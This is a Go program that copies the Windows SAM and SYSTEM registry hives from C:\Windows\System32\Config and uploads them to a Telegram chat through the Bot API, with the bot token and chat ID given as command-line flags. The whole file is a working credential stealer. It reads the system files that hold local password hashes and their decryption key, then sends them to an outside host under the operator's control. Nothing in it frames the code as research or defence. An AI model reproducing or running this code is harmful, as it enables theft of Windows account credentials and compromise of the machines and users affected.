package main

import (
    "bytes"
    "flag"
    "fmt"
    "io"
    "io/ioutil"
    "mime/multipart"
    "net/http"
    "os"
    "path/filepath"
)

// SendFileToTelegram sends a file to a Telegram chat using the Bot API.
func SendFileToTelegram(filePath, telegramBotToken, chatId string) error {
    url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", telegramBotToken)

    // Open the file for sending
    file, err := os.Open(filePath)
    if err != nil {
        return fmt.Errorf("failed to open file: %w", err)
    }
    defer file.Close()

    // Create a buffer to hold the form data
    var buf bytes.Buffer
    writer := multipart.NewWriter(&buf)

    // Create the form file field
    part, err := writer.CreateFormFile("document", filepath.Base(file.Name()))
    if err != nil {
        return fmt.Errorf("failed to create form file: %w", err)
    }

    // Copy the file content into the form file field
    if _, err := io.Copy(part, file); err != nil {
        return fmt.Errorf("failed to copy file contents: %w", err)
    }

    // Add the chat_id field
    if err := writer.WriteField("chat_id", chatId); err != nil {
        return fmt.Errorf("failed to write chat_id field: %w", err)
    }

    // Close the writer to finalize the form
    writer.Close()

    // Set up the HTTP request
    req, err := http.NewRequest(http.MethodPost, url, &buf)
    if err != nil {
        return fmt.Errorf("failed to create request: %w", err)
    }
    req.Header.Set("Content-Type", writer.FormDataContentType())

    // Perform the HTTP request
    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        return fmt.Errorf("failed to send file: %w", err)
    }
    defer resp.Body.Close()

    // Check if the response is OK
    if resp.StatusCode != http.StatusOK {
        body, _ := ioutil.ReadAll(resp.Body) // Log response body in case of error
        return fmt.Errorf("failed to send file, status: %s, response: %s", resp.Status, body)
    }

    fmt.Println("File sent successfully to Telegram.")
    return nil
}

// CopyFile copies a file from the source to the destination path.
func CopyFile(src, dst string) error {
    input, err := ioutil.ReadFile(src)
    if err != nil {
        return fmt.Errorf("could not read source file: %w", err)
    }
    if err := ioutil.WriteFile(dst, input, 0644); err != nil {
        return fmt.Errorf("could not write to destination file: %w", err)
    }
    return nil
}

// SendPass handles copying required files and sending them to Telegram.
func SendPass(destinationPath, telegramBotToken, chatId string) error {
    // Example file paths (you need to update these with the actual paths)
    samPath := `C:\Windows\System32\Config\sam`
    systemPath := `C:\Windows\System32\Config\system`

    // Ensure the destination path exists
    if err := os.MkdirAll(destinationPath, os.ModePerm); err != nil {
        return fmt.Errorf("could not create destination directory: %w", err)
    }

    // Copy required files to the destination path
    if err := CopyFile(samPath, filepath.Join(destinationPath, "sam")); err != nil {
        return fmt.Errorf("error copying SAM file: %w", err)
    }
    if err := CopyFile(systemPath, filepath.Join(destinationPath, "system")); err != nil {
        return fmt.Errorf("error copying SYSTEM file: %w", err)
    }

    // Send files to Telegram
    if err := SendFileToTelegram(filepath.Join(destinationPath, "sam"), telegramBotToken, chatId); err != nil {
        return err
    }
    if err := SendFileToTelegram(filepath.Join(destinationPath, "system"), telegramBotToken, chatId); err != nil {
        return err
    }

    return nil
}

// Main entry point of the application.
func main() {
    // Define command-line flags
    destinationPath := flag.String("destination", "C:\\temp", "Path to save copied files")
    telegramBotToken := flag.String("token", "", "Your Telegram bot token")
    chatId := flag.String("chatid", "", "Your Telegram chat ID")

    // Parse the flags
    flag.Parse()

    // Validate required flags
    if *telegramBotToken == "" || *chatId == "" {
        fmt.Println("Error: Telegram bot token and chat ID must be provided.")
        flag.Usage()
        os.Exit(1)
    }

    // Execute the SendPass function and handle errors
    if err := SendPass(*destinationPath, *telegramBotToken, *chatId); err != nil {
        fmt.Printf("Error: %v\n", err)
    }
}
